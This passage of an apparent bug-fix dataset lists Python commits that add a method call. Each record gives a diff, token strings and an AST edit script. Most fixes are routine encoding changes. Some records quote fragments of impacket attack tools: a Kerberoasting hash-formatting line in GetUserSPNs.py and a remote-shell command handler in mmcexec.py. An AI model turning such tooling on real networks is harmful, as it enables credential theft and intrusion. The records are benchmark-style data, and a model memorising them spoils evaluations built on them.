16, 3, 44], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'+'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'%20'\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "amazon_reviews", "commit_sha": "33752d7d8ebd8289ac219b823248541e6d5a8979", "parent_sha": "149942b7e7904d64b95b728dab34bf10cd2a6f87", "file_path": "main.py", "project_url": "https://github.com/laba2346/amazon_reviews", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ def reduceReview(reviewStr):\n     stopWords = set(stopwords.words('english'))\n     lmtzr = WordNetLemmatizer()\n     wordList = re.sub(\"[^\\w&^']\", \" \", reviewStr).split()\n-    lemmaList = [lmtzr.lemmatize(word) for word in wordList if word not in stopWords]\n+    lemmaList = [lmtzr.lemmatize(word) for word in wordList if word.lower() not in stopWords]\n     teardown_module()\n     return lemmaList\n \n", "before": "lemmaList = [ lmtzr . lemmatize ( word ) for word in wordList if word not in stopWords ]", "after": "lemmaList = [ lmtzr . lemmatize ( word ) for word in wordList if word . lower ( ) not in stopWords ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 64, 3, 85], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:word\", 3, 64, 3, 68], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "0ac3592b92c42eb8040b4270b9f6dec4089f7e41", "parent_sha": "e6eb7d47eb345828db3ba8687d8561b30de3c2f1", "file_path": "lib/ansible/modules/extras/system/locale_gen.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def is_present(name):\n def fix_case(name):\n     \"\"\"locale -a might return the encoding in either lower or upper case.\n     Passing through this function makes them uniform for comparisons.\"\"\"\n-    return name.replace(\".utf8\", \".UTF-8\")\n+    return name.replace(\".utf8\", \".UTF-8\").replace(\".eucjp\", \".EUC-JP\")\n \n def replace_line(existing_line, new_line):\n     \"\"\"Replaces lines in /etc/locale.gen\"\"\"\n", "before": "return name . replace ( \".utf8\" , \".UTF-8\" )", "after": "return name . replace ( \".utf8\" , \".UTF-8\" ) . replace ( \".eucjp\" , \".EUC-JP\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 43], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 43], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\".eucjp\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:\\\".EUC-JP\\\"\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "impacket", "commit_sha": "dc4606822e489e62d276bc3c928af31cd860f4a0", "parent_sha": "49a07a5fa7372abd7a6b5eeec8d039b1add4e86d", "file_path": "impacket/smb3.py", "project_url": "https://github.com/colvinwellborn/impacket", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class SMB3:\n         self.RequireMessageSigning = False    #\n         self.ConnectionTable = {}\n         self.GlobalFileTable = {}\n-        self.ClientGuid = ''                  #\n+        self.ClientGuid = ''.join([random.choice(string.letters) for i in range(16)])\n         # Only for SMB 3.0\n         self.EncryptionAlgorithmList = ['AES-CCM']\n         self.MaxDialect = []\n", "before": "self . ClientGuid = ''", "after": "self . ClientGuid = '' . join ( [ random . choice ( string . letters ) for i in range ( 16 ) ] )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 29], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"string:''\", 3, 27, 3, 29], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"list_comprehension\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N3\", [\"call\", \"N4\"], 1], [\"Insert\", \"N3\", [\"for_in_clause\", \"N5\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"attribute\", \"N6\"], 0], [\"Insert\", \"N4\", [\"argument_list\", \"N7\"], 1], [\"Insert\", \"N5\", [\"for:for\", \"T\"], 0], [\"Insert\", \"N5\", [\"identifier:i\", \"T\"], 1], [\"Insert\", \"N5\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N5\", [\"call\", \"N8\"], 3], [\"Insert\", \"N6\", [\"identifier:random\", \"T\"], 0], [\"Insert\", \"N6\", [\".:.\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:choice\", \"T\"], 2], [\"Insert\", \"N7\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N7\", [\"attribute\", \"N9\"], 1], [\"Insert\", \"N7\", [\"):)\", \"T\"], 2], [\"Insert\", \"N8\", [\"identifier:range\", \"T\"], 0], [\"Insert\", \"N8\", [\"argument_list\", \"N10\"], 1], [\"Insert\", \"N9\", [\"identifier:string\", \"T\"], 0], [\"Insert\", \"N9\", [\".:.\", \"T\"], 1], [\"Insert\", \"N9\", [\"identifier:letters\", \"T\"], 2], [\"Insert\", \"N10\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N10\", [\"integer:16\", \"T\"], 1], [\"Insert\", \"N10\", [\"):)\", \"T\"], 2]]"}
{"project": "conda-verify", "commit_sha": "657c244e6fb078521db803122feaded07ae11f3b", "parent_sha": "59c6e8e318ea9f2329dcefc41151316d9afece88", "file_path": "conda_verify/package.py", "project_url": "https://github.com/isuruf/conda-verify", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class TarCheck(object):\n             sys.exit('Error: duplicate members')\n \n     def info_files(self):\n-        lista = [p.strip() for p in\n+        lista = [p.decode('utf-8').strip() for p in\n                  self.t.extractfile('info/files').readlines()]\n         for p in lista:\n             if p.startswith('info/'):\n", "before": "lista = [ p . strip ( ) for p in self . t . extractfile ( 'info/files' ) . readlines ( ) ]", "after": "lista = [ p . decode ( 'utf-8' ) . strip ( ) for p in self . t . extractfile ( 'info/files' ) . readlines ( ) ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 18, 3, 25], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 18, 3, 25], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:p\", 3, 18, 3, 19], 0], [\"Move\", \"N1\", [\".:.\", 3, 19, 3, 20], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "conda-verify", "commit_sha": "90a5872de7812fd7e63404409f98d5c340ec75f4", "parent_sha": "13bbecf5fe1ce25b4eb767c623bc9fcf37ab6d8b", "file_path": "anaconda_verify/package.py", "project_url": "https://github.com/isuruf/conda-verify", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class CondaPackageCheck(object):\n             if self.info['platform'] == 'win':\n                 print(\"WARNING: %s\" % m.path)\n             data = self.t.extractfile(m.path).read()\n-            for line in data.splitlines():\n+            for line in data.decode('utf-8').splitlines():\n                 self._check_has_prefix_line(line)\n \n \n", "before": "for line in data . splitlines ( ) : self . _check_has_prefix_line ( line )", "after": "for line in data . decode ( 'utf-8' ) . splitlines ( ) : self . _check_has_prefix_line ( line )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 25, 3, 40], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 25, 3, 40], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:data\", 3, 25, 3, 29], 0], [\"Move\", \"N1\", [\".:.\", 3, 29, 3, 30], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "conda-smithy", "commit_sha": "6a5c30eded05a02699fafef905b8825481f9a1a0", "parent_sha": "3975c6d712909d215e64b7169aa9b5bb5073bf8f", "file_path": "conda_smithy/ci_register.py", "project_url": "https://github.com/isuruf/conda-smithy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ def appveyor_encrypt_binstar_token(feedstock_directory, user, project):\n     if not code:\n         code = {}\n \n-    code.setdefault('appveyor', {}).setdefault('secure', {})['BINSTAR_TOKEN'] = response.content\n+    code.setdefault('appveyor', {}).setdefault('secure', {})['BINSTAR_TOKEN'] = response.content.decode('utf-8')\n     with open(forge_yaml, 'w') as fh:\n         fh.write(ruamel.yaml.dump(code, Dumper=ruamel.yaml.RoundTripDumper))\n \n", "before": "code . setdefault ( 'appveyor' , { } ) . setdefault ( 'secure' , { } ) [ 'BINSTAR_TOKEN' ] = response . content", "after": "code . setdefault ( 'appveyor' , { } ) . setdefault ( 'secure' , { } ) [ 'BINSTAR_TOKEN' ] = response . content . decode ( 'utf-8' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 97], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 81, 3, 97], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "pst", "commit_sha": "ddf79a907b375496ece88383164882c257bd5d15", "parent_sha": "9789fa3b3889e748395dde1ca054d6f3a283beb5", "file_path": "pst.py", "project_url": "https://github.com/mixedconnections/pst", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ def less(data):\n     process = subprocess.Popen([\"less\"], stdin=subprocess.PIPE)\n \n     try:\n-        process.stdin.write(data)\n+        process.stdin.write(data.encode('utf-8'))\n         process.communicate()\n     except IOError as e:\n         pass\n", "before": "process . stdin . write ( data )", "after": "process . stdin . write ( data . encode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 34], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 28, 3, 34], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:data\", 3, 29, 3, 33], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 33, 3, 34], 2]]"}
{"project": "website", "commit_sha": "9c036b5532f84227b9a7d49662ddbc5d09abd8a8", "parent_sha": "4fd723e0dc085fed2e3e1f50390c0e2d26b68a78", "file_path": "app/tests/test_user.py", "project_url": "https://github.com/kthaisociety/website", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ from app.tests.factories import UserFactory\n @pytest.mark.django_db\n def test_login():\n     # Create a user\n-    password = factory.Faker(\"word\")\n+    password = factory.Faker(\"word\").generate()\n     user = UserFactory(\n         password=factory.PostGenerationMethodCall(\"set_password\", password)\n     )\n", "before": "password = factory . Faker ( \"word\" )", "after": "password = factory . Faker ( \"word\" ) . generate ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 37], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 37], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 37], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:generate\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "impacket", "commit_sha": "e8764446b54193292cc88973ba7965eea5c945f8", "parent_sha": "f04398f2e331330cc18e97208e0ae5bb639252c1", "file_path": "impacket/nmb.py", "project_url": "https://github.com/colvinwellborn/impacket", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -606,7 +606,7 @@ def encode_name(name, type, scope):\n             encoded_scope = encoded_scope + chr(len(s)) + s\n         return encoded_name + encoded_scope + '\\0'\n     else:\n-        return encoded_name + '\\0'\n+        return encoded_name.encode('ascii') + '\\0'\n \n # Internal method for use in encode_name()\n def _do_first_level_encoding(m):\n", "before": "else : return encoded_name + '\\0'", "after": "else : return encoded_name . encode ( 'ascii' ) + '\\0'", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 35], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:encoded_name\", 3, 16, 3, 28], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'ascii'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "impacket", "commit_sha": "7c144867073a279d3e2c6fb878383d1d16c8b97b", "parent_sha": "5ae1231c4d4a01492484d3f2c9ad0dc068fd066f", "file_path": "examples/GetUserSPNs.py", "project_url": "https://github.com/colvinwellborn/impacket", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ class GetUserSPNs:\n         #\n         if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:\n             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (\n-                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn,\n+                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),\n                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),\n                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))\n             if fd is None:\n", "before": "entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % ( constants . EncryptionTypes . rc4_hmac . value , username , decodedTGS [ 'ticket' ] [ 'realm' ] , spn , hexlify ( str ( decodedTGS [ 'ticket' ] [ 'enc-part' ] [ 'cipher' ] [ : 16 ] ) ) , hexlify ( str ( decodedTGS [ 'ticket' ] [ 'enc-part' ] [ 'cipher' ] [ 16 : ] ) ) )", "after": "entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % ( constants . EncryptionTypes . rc4_hmac . value , username , decodedTGS [ 'ticket' ] [ 'realm' ] , spn . replace ( ':' , '~' ) , hexlify ( str ( decodedTGS [ 'ticket' ] [ 'enc-part' ] [ 'cipher' ] [ : 16 ] ) ) , hexlify ( str ( decodedTGS [ 'ticket' ] [ 'enc-part' ] [ 'cipher' ] [ 16 : ] ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"tuple\", 2, 54, 5, 79], [\"call\", \"N0\"], 7], [\"Insert\", [\"tuple\", 2, 54, 5, 79], [\",:,\", \"T\"], 8], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:spn\", 3, 100, 3, 103], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:':'\", \"T\"], 1], [\"Move\", \"N2\", [\",:,\", 3, 103, 3, 104], 2], [\"Insert\", \"N2\", [\"string:'~'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "impacket", "commit_sha": "cf246b593f58b863e79e93228351c063b2b3e598", "parent_sha": "4757b0d225f0bcab17195decccab11a45d1c2ea5", "file_path": "examples/mmcexec.py", "project_url": "https://github.com/colvinwellborn/impacket", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -329,7 +329,7 @@ class RemoteShell(cmd.Cmd):\n         arg2['clSize'] = 5\n         arg2['vt'] = VARENUM.VT_BSTR\n         arg2['_varUnion']['tag'] = VARENUM.VT_BSTR\n-        arg2['_varUnion']['bstrVal']['asData'] = command\n+        arg2['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)\n \n         arg3 = VARIANT(None, False)\n         arg3['clSize'] = 5\n", "before": "arg2 [ '_varUnion' ] [ 'bstrVal' ] [ 'asData' ] = command", "after": "arg2 [ '_varUnion' ] [ 'bstrVal' ] [ 'asData' ] = command . decode ( sys . stdin . encoding )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 57], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:command\", 3, 50, 3, 57], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:encoding\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:stdin\", \"T\"], 2]]"}
{"project": "Challenge2018", "commit_sha": "0be3392a8c4f4f3218df326f47a8f7fe06727feb", "parent_sha": "22da51ac16965e68eecc2159f035de2f18e34da2", "file_path": "papersmith/editor/views.py", "project_url": "https://github.com/ai-writing/Challenge2018", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def check():\n     # using csrf exempt for now; to add csrf, refer to: http://flask.pocoo.org/snippets/3/\n     # <form method=post action=\"\"><input name=_csrf_token type=hidden value=\"{{ csrf_token() }}\"></form>\n \n-    content = json.loads(request.data)['paperBody']\n+    content = json.loads(request.data.decode('utf8'))['paperBody']\n     print(content)\n     grammar_results = grammar.check(content)\n     spelling_results = spelling.check(content)\n", "before": "content = json . loads ( request . data ) [ 'paperBody' ]", "after": "content = json . loads ( request . data . decode ( 'utf8' ) ) [ 'paperBody' ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 39], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 25, 3, 39], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 26, 3, 38], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 38, 3, 39], 2]]"}
{"project": "ansible-1", "commit_sha": "e97d448838d759759df723962cad43ba297cacf8", "parent_sha": "5db9e38377920268b1263ec0dfa87aeddc9c2ea2", "file_path": "lib/ansible/inventory/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -605,7 +605,7 @@ class Inventory(object):\n             #        we do this shouldn't be too much of an issue. Still, this should\n             #        be fixed at some point to allow a \"first load\" to touch all of the\n             #        directories, then later runs only touch the new basedir specified\n-            for group in self.groups:\n+            for group in self.groups.values():\n                 #group.vars = combine_vars(group.vars, self.get_group_vars(group, new_pb_basedir=True))\n                 group.vars = combine_vars(group.vars, self.get_group_vars(group))\n             # get host vars from host_vars/ files\n", "before": "for group in self . groups : group . vars = combine_vars ( group . vars , self . get_group_vars ( group ) )", "after": "for group in self . groups . values ( ) : group . vars = combine_vars ( group . vars , self . get_group_vars ( group ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 13, 5, 82], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 26, 3, 37], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:values\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "conda-build", "commit_sha": "9a2d27977d8b38152c5662138f902ab0aedc2e10", "parent_sha": "96e95427c40283d82a910ff8d662afb71d72dc2b", "file_path": "conda_build/build.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -743,7 +743,7 @@ def filter_files(files_list, prefix, filter_patterns=('.*[\\\\\\\\/]?\\.git[\\\\\\\\/].*'\n     for pattern in filter_patterns:\n         r = re.compile(pattern)\n         files_list = set(files_list) - set(filter(r.match, files_list))\n-    return [f for f in files_list if not os.path.isdir(os.path.join(prefix, f))]\n+    return [f.replace(prefix + os.path.sep, '') for f in files_list if not os.path.isdir(os.path.join(prefix, f))]\n \n \n def bundle_conda(output, metadata, config, env, **kw):\n", "before": "return [ f for f in files_list if not os . path . isdir ( os . path . join ( prefix , f ) ) ]", "after": "return [ f . replace ( prefix + os . path . sep , '' ) for f in files_list if not os . path . isdir ( os . path . join ( prefix , f ) ) ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"list_comprehension\", 3, 12, 3, 81], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:f\", 3, 13, 3, 14], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"binary_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:''\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:prefix\", \"T\"], 0], [\"Insert\", \"N3\", [\"+:+\", \"T\"], 1], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:sep\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "49927546d2b306830c98f6f9da4a6ad828f6a3a6", "parent_sha": "d6155d095513be3f500d089c4ed4c4b89949d560", "file_path": "lib/bb/runqueue.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2124,7 +2124,7 @@ class RunQueueExecute:\n     # as most code can't handle them\n     def build_taskdepdata(self, task):\n         taskdepdata = {}\n-        next = self.rqdata.runtaskentries[task].depends\n+        next = self.rqdata.runtaskentries[task].depends.copy()\n         next.add(task)\n         next = self.filtermcdeps(task, next)\n         while next:\n", "before": "next = self . rqdata . runtaskentries [ task ] . depends", "after": "next = self . rqdata . runtaskentries [ task ] . depends . copy ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 56], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 16, 3, 56], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:copy\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "conda-build", "commit_sha": "ce14461bf15ec66d41f6ac2f46e41e66ac06ce72", "parent_sha": "2c888b48c1250ffbf86570831b76b47c0fc87364", "file_path": "conda_build/create_test.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def create_files(m, test_dir=None):\n \n     for pattern in ensure_list(m.get_value('test/files', [])):\n         has_files = True\n-        files = glob(join(m.path, pattern))\n+        files = glob(join(m.path, pattern.replace('/', os.sep)))\n         for f in files:\n             copy_into(f, f.replace(m.path, test_dir), m.config.timeout, locking=False,\n                     clobber=True)\n", "before": "files = glob ( join ( m . path , pattern ) )", "after": "files = glob ( join ( m . path , pattern . replace ( '/' , os . sep ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 43], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 26, 3, 43], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:pattern\", 3, 35, 3, 42], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'/'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 3], [\"Move\", \"N2\", [\"):)\", 3, 42, 3, 43], 4], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:sep\", \"T\"], 2]]"}
